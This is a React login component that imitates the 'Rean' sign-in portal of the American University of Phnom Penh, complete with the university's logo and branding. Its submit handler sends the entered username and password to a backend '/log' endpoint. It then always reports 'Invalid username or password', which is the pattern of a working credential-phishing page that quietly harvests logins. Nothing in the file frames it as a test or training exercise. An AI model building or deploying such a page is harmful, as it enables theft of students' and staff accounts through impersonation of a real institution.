import React, { useState } from "react";
import fall from '../assets/fall.png';
import "./Login.css"
import "bootstrap/dist/css/bootstrap.min.css";
import 'bootstrap/scss/bootstrap.scss';



const BACKEND = import.meta.env?.VITE_BACKEND_URL || "http://localhost:5000";

export default function Login() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await fetch(`${BACKEND}/log`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      setMsg("Invalid username or password");
      setPassword("");
    } catch (err) {
      setMsg("Network error");
      console.error(err);
    }
  };

  return (
    <div className="login-container_camu">
      <div className="row login-full-container m-0 px-[16%] py-[34px]">

        {/* Left Section */}
        <div className="col-lg-6 left-grid">
          <div className="left-back-img">
            <img
              src="data:image/svg+xml;base64,"
              alt="Application Poster"
            />
          </div>
          <div className="login-details-left">
            <div className="login-banner_view">
              <div className="left-banner-section mb-5">
                <div id="login-box" className="no_margin login-banner-box mainblock visible m-0">
                  <img src={fall} alt="Fall"/>
                </div>
              </div>
              <p className="fs-6 text-white fw-bold flex text-center">University Management System</p>
              <p className="text-white flex text-center">Prioritize user expertience by creating an intuitive interface that is easy to navigate, ensuring quick and hassie-free access to the system</p>

            </div>
          </div>
        </div>

        {/* Right Section */}
        <div className="col-lg-6 d-flex flex-column justify-content-center align-items-center position-relative bg-white p-4">
          {/* Top Right Create Account */}
          <div className="position-absolute top-0 end-0 p-3">
            <span className="me-2 text-muted">New to Rean?</span>
            <button className="btn btn-outline-primary btn-sm">Create an account</button>
          </div>

          {/* Login Box */}
          <div className="w-100" style={{ maxWidth: "400px" }}>
            <div className="text-center mb-4">
              <h6 className="fw-bold mb-2">AMERICAN UNIVERSITY</h6>
              <h6 className="fw-bold mb-3">OF FINANCIAL FEARS</h6>
              <img
                src="https://upload.wikimedia.org/wikipedia/en/9/98/AUPP_logo.png"
                alt="AUPP Logo"
                style={{ height: "80px" }}
                className="mb-2"
              />
              <h6 className="fw-semibold mb-1">American University of Phnom Penh</h6>
              <a href="#" className="small text-primary text-decoration-none">
                Not from American University of Phnom Penh?
              </a>
            </div>

            <h5 className="mb-3 fw-bold text-center">Login to Rean</h5>

            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <label className="form-label">User name</label>
                <input
                  type="text"
                  className="form-control"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
              </div>
              <div className="mb-2">
                <label className="form-label">Password</label>
                <input
                  type="password"
                  className="form-control"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>
              <div className="text-end mb-3">
                <a href="#" className="small text-primary text-decoration-none">
                  Forgot password?
                </a>
              </div>
              {msg && <p className="text-danger text-center">{msg}</p>}
              <button type="submit" className="btn btn-primary w-100 mb-3">
                Login
              </button>
            </form>

            <div className="text-center text-muted mb-3">OR</div>

            <div className="d-grid gap-2">
              <button className="btn btn-outline-secondary w-100">
                <i className="bi bi-google me-2"></i> Continue with Google
              </button>
              <button className="btn btn-outline-secondary w-100">
                <i className="bi bi-microsoft me-2"></i> Continue with Microsoft
              </button>
            </div>

            <p className="text-center small text-muted mt-4 mb-0">
              2024 Â© University Technologies. All Rights Reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
